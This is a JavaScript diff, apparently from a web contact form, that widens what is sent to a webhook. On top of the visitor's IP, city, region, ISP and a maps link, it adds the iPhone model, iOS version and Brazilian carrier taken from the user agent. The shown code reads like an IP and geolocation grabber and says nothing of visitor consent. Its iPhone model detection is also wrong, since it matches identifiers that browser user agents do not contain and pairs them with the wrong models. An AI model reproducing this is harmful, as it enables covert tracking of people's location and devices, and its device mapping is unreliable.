@@ -407,7 +407,33 @@
 
             try {
                 const geo = await getUserIPAndGeo();
-                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Mensagem:** ${message}`;
+                const userAgent = navigator.userAgent;
+                
+                // Detectar modelo do iPhone
+                let iphoneModel = 'Não identificado';
+                let iosVersion = 'Não identificado';
+                let operadora = 'Não identificado';
+                
+                if (userAgent.includes('iPhone')) {
+                    if (userAgent.includes('iPhone15,1') || userAgent.includes('iPhone15,2')) iphoneModel = 'iPhone 15';
+                    else if (userAgent.includes('iPhone15,3') || userAgent.includes('iPhone15,4')) iphoneModel = 'iPhone 15 Pro';
+                    else if (userAgent.includes('iPhone14,')) iphoneModel = 'iPhone 14';
+                    else if (userAgent.includes('iPhone13,')) iphoneModel = 'iPhone 13';
+                    else if (userAgent.includes('iPhone12,')) iphoneModel = 'iPhone 12';
+                    else if (userAgent.includes('iPhone11,')) iphoneModel = 'iPhone 11';
+                    else iphoneModel = 'iPhone';
+                    
+                    const iosMatch = userAgent.match(/OS (\d+_\d+)/);
+                    if (iosMatch) iosVersion = 'iOS ' + iosMatch[1].replace('_', '.');
+                    
+                    if (geo.isp.includes('Vivo')) operadora = 'Vivo';
+                    else if (geo.isp.includes('Claro')) operadora = 'Claro';
+                    else if (geo.isp.includes('Tim')) operadora = 'TIM';
+                    else if (geo.isp.includes('Oi')) operadora = 'Ói';
+                    else operadora = geo.isp;
+                }
+                
+                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Dispositivo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n**Mensagem:** ${message}`;
                 const messageWithoutIP = `**Nome/ID:** ${name}\n**Mensagem:** ${message}`;
 
                 const response = await fetch(WEBHOOK_URL, {
